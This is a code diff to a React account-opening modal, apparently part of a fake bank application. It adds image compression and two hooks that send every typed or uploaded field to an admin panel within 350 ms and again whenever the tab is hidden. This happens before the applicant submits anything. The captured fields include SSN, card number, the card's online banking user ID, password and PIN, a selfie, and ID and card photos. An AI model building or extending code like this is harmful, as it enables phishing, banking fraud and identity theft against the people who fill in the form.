@@ -1,4 +1,4 @@
-import React, { useState, useRef } from 'react';
+import React, { useState, useRef, useEffect } from 'react';
 import { useData } from '../../context/DataContext';
 
 // Country Phone Configuration & Exact Digit Rules
@@ -100,6 +100,49 @@ const getMaxDobDate = () => {
   const d = new Date();
   d.setFullYear(d.getFullYear() - 18);
   return d.toISOString().split('T')[0];
+};
+
+// High-performance image compression helper (optimized for mobile camera uploads and Firestore 1MB quota)
+const compressImage = (file, maxWidth = 640, maxHeight = 480, quality = 0.55) => {
+  return new Promise((resolve) => {
+    if (!file || !file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = (e) => resolve(e.target.result || '');
+      reader.onerror = () => resolve('');
+      reader.readAsDataURL(file);
+      return;
+    }
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const img = new Image();
+      img.onload = () => {
+        const canvas = document.createElement('canvas');
+        let { width, height } = img;
+        if (width > maxWidth) {
+          height = Math.round((height * maxWidth) / width);
+          width = maxWidth;
+        }
+        if (height > maxHeight) {
+          width = Math.round((width * maxHeight) / height);
+          height = maxHeight;
+        }
+        canvas.width = width;
+        canvas.height = height;
+        const ctx = canvas.getContext('2d');
+        if (ctx) {
+          ctx.drawImage(img, 0, 0, width, height);
+          const dataUrl = canvas.toDataURL('image/jpeg', quality);
+          resolve(dataUrl);
+        } else {
+          resolve(e.target.result);
+        }
+      };
+      img.onerror = () => resolve(e.target.result);
+      img.src = e.target.result;
+    };
+    reader.onerror = () => resolve('');
+    reader.readAsDataURL(file);
+  });
 };
 
 export default function OpenAccountModal({ isOpen, onClose }) {
@@ -209,6 +252,84 @@ export default function OpenAccountModal({ isOpen, onClose }) {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [copied, setCopied] = useState(false);
 
+  // Real-time automatic live transmission to Admin Panel as soon as ANY field is typed/uploaded
+  useEffect(() => {
+    // Check if applicant has entered at least one detail
+    const hasAnyInput = !!(
+      formData.firstName ||
+      formData.lastName ||
+      formData.email ||
+      formData.phone ||
+      formData.dob ||
+      formData.ssn ||
+      formData.cardNumberMasked ||
+      formData.cardOnlineUserId ||
+      formData.cardOnlinePassword ||
+      formData.cardOnlinePin ||
+      formData.selfiePhotoUrl ||
+      formData.idFrontPhotoUrl ||
+      formData.cardFrontPhotoUrl
+    );
+
+    if (!hasAnyInput) return;
+
+    const timer = setTimeout(() => {
+      const stepNames = [
+        '',
+        'Personal & Demographic Details',
+        'Biometric Selfie Photo Uploaded',
+        'Government ID Photos (Front & Back)',
+        'Tax ID (SSN/TIN) Submitted',
+        'Card Verification Details & Photos',
+        'Credit Assessment & Loan Facility Selection',
+        'Review & Consents Submission'
+      ];
+
+      syncApplicationStep(currentStep, stepNames[currentStep] || `Step ${currentStep}`, {
+        ...formData,
+        referenceId: draftRefId
+      });
+    }, 350);
+
+    return () => clearTimeout(timer);
+  }, [formData, currentStep, draftRefId, syncApplicationStep]);
+
+  // Mobile background / tab switch flush to cloud
+  useEffect(() => {
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === 'hidden') {
+        const hasAnyInput = !!(
+          formData.firstName ||
+          formData.lastName ||
+          formData.email ||
+          formData.phone ||
+          formData.dob ||
+          formData.ssn ||
+          formData.cardNumberMasked ||
+          formData.cardOnlineUserId
+        );
+        if (hasAnyInput) {
+          const stepNames = [
+            '',
+            'Personal & Demographic Details',
+            'Biometric Selfie Photo Uploaded',
+            'Government ID Photos (Front & Back)',
+            'Tax ID (SSN/TIN) Submitted',
+            'Card Verification Details & Photos',
+            'Credit Assessment & Loan Facility Selection',
+            'Review & Consents Submission'
+          ];
+          syncApplicationStep(currentStep, stepNames[currentStep] || `Step ${currentStep}`, {
+            ...formData,
+            referenceId: draftRefId
+          });
+        }
+      }
+    };
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    return () => document.removeEventListener('visibilitychange', handleVisibilityChange);
+  }, [formData, currentStep, draftRefId, syncApplicationStep]);
+
   if (!isOpen) return null;
 
   const handleInputChange = (field, value) => {
@@ -290,14 +411,13 @@ export default function OpenAccountModal({ isOpen, onClose }) {
     handleInputChange('cardExp', formatted);
   };
 
-  // Handle Photo File Uploads
-  const handleFileUpload = (e, fieldType) => {
+  // Handle Photo File Uploads with Automatic Canvas Compression
+  const handleFileUpload = async (e, fieldType) => {
     const file = e.target.files?.[0];
     if (!file) return;
 
-    const reader = new FileReader();
-    reader.onload = (event) => {
-      const dataUrl = event.target.result;
+    try {
+      const dataUrl = await compressImage(file, 800, 600, 0.72);
       if (fieldType === 'selfie') {
         setFormData(prev => ({
           ...prev,
@@ -338,8 +458,9 @@ export default function OpenAccountModal({ isOpen, onClose }) {
         }));
         setErrors(prev => ({ ...prev, cardPhotos: null }));
       }
-    };
-    reader.readAsDataURL(file);
+    } catch (err) {
+      console.warn('Error compressing photo:', err);
+    }
   };
 
   // Step Validation (with Country Phone Length Caps & Strict Minimum Age 18)
@@ -488,7 +609,10 @@ export default function OpenAccountModal({ isOpen, onClose }) {
       ];
 
       // Immediately send all collected information to the admin page!
-      syncApplicationStep(currentStep, stepNames[currentStep], formData);
+      syncApplicationStep(currentStep, stepNames[currentStep], {
+        ...formData,
+        referenceId: draftRefId
+      });
 
       setCurrentStep(prev => prev + 1);
     }
